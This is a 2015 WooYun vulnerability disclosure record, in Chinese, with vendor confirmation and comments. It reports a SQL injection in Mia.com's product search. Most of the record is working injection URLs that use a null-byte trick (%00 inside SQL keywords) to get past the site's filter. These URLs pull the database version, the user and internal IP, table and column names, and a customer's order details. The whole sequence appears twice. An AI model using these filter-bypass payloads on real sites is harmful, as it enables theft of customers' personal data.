{"id": 71518, "wybug_id": "wooyun-2015-0145168", "wybug_title": "蜜芽网进口母婴代码参数过滤不严导致SQL注入或引发千万用户泄露绕过MYSQL防注入", "wybug_corp": "蜜芽", "wybug_author": "我与国家共进退", "wybug_date": "2015-10-15 22:33", "wybug_open_date": "2015-11-30 11:26", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-15：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-16：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-10-26：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-11-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-11-30：\t细节向公众公开  简要描述： 代码审核不严导致SQL注入或引发千万用户泄露,绕过MYSQL防注入 详细说明：  蜜芽网此站有防SQL注入写法，普通的联合查询马上就禁止访问了，查看代码通过转义轻松绕过：得到数据库版本,系统用户,当前数据库如下:操作如下:http://www.mia.com/search/s?cat=46&b=1505 and 1=2 uni%00on select 1,group_concat(version(),0x3a,system_user(),0x3a,dat%00abase()),3,4,5,6,7,8,9,10--结果如下:5.5.17-log\tmiababy_read@10.0.11.55\tmia获取到所有数据库名:http://www.mia.com/search/s?cat=46&b=1505 and 1=2 uni%00on select 1,group_concat(schema_name),3,4,5,6,7,8,9,10 fro%00m information_schema.schemata--结果如下:information_schema,log,mia,test\n\n获取当前数据库下所有表名:http://www.mia.com/search/s?cat=46&b=1505 and 1=2 uni%00on select 1,group_concat(tab%00le_name),3,4,5,6,7,8,9,10 fro%00m information_schema.tab%00les where tab%00le_schema=dat%00abase()--逐条增加:http://www.mia.com/search/s?cat=46&b=1505 and 1=2 uni%00on select 1,concat(tab%00le_name),3,4,5,6,7,8,9,10 fro%00m information_schema.tab%00les where tab%00le_schema=dat%00abase() lim%00it 16,1--结果如下:620_pandian_20150925CPSCPS_Category_Brand_ValueCPS_ChannelCPS_Item_Value__orders_old_orders_new_orders_oldaccount_app_mobile_verifyaccount_balance_infoaccount_balance_info_150827account_balance_payments_logaccount_balance_payments_log_150827account_cell_findpwdaccount_cell_registeraccount_cell_verifyaccount_email_verifyaccount_resetpwdactivity_iconactivity_icon_excelactivity_icon_itemsadminssadminsssadv_billadv_bill_recordadv_cross_border_billadv_cross_border_detailadv_cross_border_regulation_bill......\n\n得到 orders 所有字段:http://www.mia.com/search/s?cat=46&b=1505 and 1=2 uni%00on select 1,group_concat(column_name),3,4,5,6,7,8,9,10+fro%00m+information_schema.columns+where+tab%00le_name=0x6F7264657273--结果如下:idorder_codesuperior_order_codeuser_idinput_idtransaction_iduser_remarkcancel_user_iddst_namedst_provincedst_citydst_areadst_streetdst_addressdst_mobiledst_teldst_codesale_pricedeal_priceship_pricecash_coupon_pricecoupon_pricereduce_pricepay_priceorder_timepay_timeactual_pay_timecancel_timeconfirm_timefinish_timestatuswarehouse_idis_paidpay_modedst_mode\n\n读取id为 9036065 的订单:http://www.mia.com/search/s?cat=46&b=1505 and 1=2 uni%00on select 1,concat(id,0x21,dst_name,0x21,dst_province,0x21,dst_city,0x21,dst_area,0x21,dst_address,0x21,dst_mobile,0x21,order_time,0x21,pay_price),3,4,5,6,7,8,9,10+fro%00m+orders+where+id = 9036065 --\n\n   漏洞证明：  蜜芽网此站有防SQL注入写法，普通的联合查询马上就禁止访问了，查看代码通过转义轻松绕过：得到数据库版本,系统用户,当前数据库如下:操作如下:http://www.mia.com/search/s?cat=46&b=1505 and 1=2 uni%00on select 1,group_concat(version(),0x3a,system_user(),0x3a,dat%00abase()),3,4,5,6,7,8,9,10--结果如下:5.5.17-log\tmiababy_read@10.0.11.55\tmia获取到所有数据库名:http://www.mia.com/search/s?cat=46&b=1505 and 1=2 uni%00on select 1,group_concat(schema_name),3,4,5,6,7,8,9,10 fro%00m information_schema.schemata--结果如下:information_schema,log,mia,test\n\n获取当前数据库下所有表名:http://www.mia.com/search/s?cat=46&b=1505 and 1=2 uni%00on select 1,group_concat(tab%00le_name),3,4,5,6,7,8,9,10 fro%00m information_schema.tab%00les where tab%00le_schema=dat%00abase()--逐条增加:http://www.mia.com/search/s?cat=46&b=1505 and 1=2 uni%00on select 1,concat(tab%00le_name),3,4,5,6,7,8,9,10 fro%00m information_schema.tab%00les where tab%00le_schema=dat%00abase() lim%00it 16,1--结果如下:620_pandian_20150925CPSCPS_Category_Brand_ValueCPS_ChannelCPS_Item_Value__orders_old_orders_new_orders_oldaccount_app_mobile_verifyaccount_balance_infoaccount_balance_info_150827account_balance_payments_logaccount_balance_payments_log_150827account_cell_findpwdaccount_cell_registeraccount_cell_verifyaccount_email_verifyaccount_resetpwdactivity_iconactivity_icon_excelactivity_icon_itemsadminssadminsssadv_billadv_bill_recordadv_cross_border_billadv_cross_border_detailadv_cross_border_regulation_bill......\n\n得到 orders 所有字段:http://www.mia.com/search/s?cat=46&b=1505 and 1=2 uni%00on select 1,group_concat(column_name),3,4,5,6,7,8,9,10+fro%00m+information_schema.columns+where+tab%00le_name=0x6F7264657273--结果如下:idorder_codesuperior_order_codeuser_idinput_idtransaction_iduser_remarkcancel_user_iddst_namedst_provincedst_citydst_areadst_streetdst_addressdst_mobiledst_teldst_codesale_pricedeal_priceship_pricecash_coupon_pricecoupon_pricereduce_pricepay_priceorder_timepay_timeactual_pay_timecancel_timeconfirm_timefinish_timestatuswarehouse_idis_paidpay_modedst_mode\n\n读取id为 9036065 的订单:http://www.mia.com/search/s?cat=46&b=1505 and 1=2 uni%00on select 1,concat(id,0x21,dst_name,0x21,dst_province,0x21,dst_city,0x21,dst_area,0x21,dst_address,0x21,dst_mobile,0x21,order_time,0x21,pay_price),3,4,5,6,7,8,9,10+fro%00m+orders+where+id = 9036065 --\n\n   修复方案：  你们比我更显专业.   版权声明：转载请注明来源 我与国家共进退@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：18  确认时间：2015-10-16 11:24 厂商回复： 非常感谢，已经通知相关部门做处理了 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-10-11 21:57 |    \t\tmango \t\t\t( 核心白帽子 |\t\t\t        Rank:1721 漏洞数:255        | 我有个2b女友！)\t\t \n  这不是有厂商了么~    \n     2015-10-15 22:33 |    \t\t乌云小秘书  \t\t\t( 普通白帽子  |\t\t\t        还没有发布任何漏洞        | 第1!绝对不意气用事!第2!绝对不漏判任何一...)\t\t \n  @mango 已经处理    \n     2015-10-28 20:13 |    \t\t程序喵 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 一只吃货程序员)\t\t \n  持续关注 感谢洞主    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 18, "Ranks": null}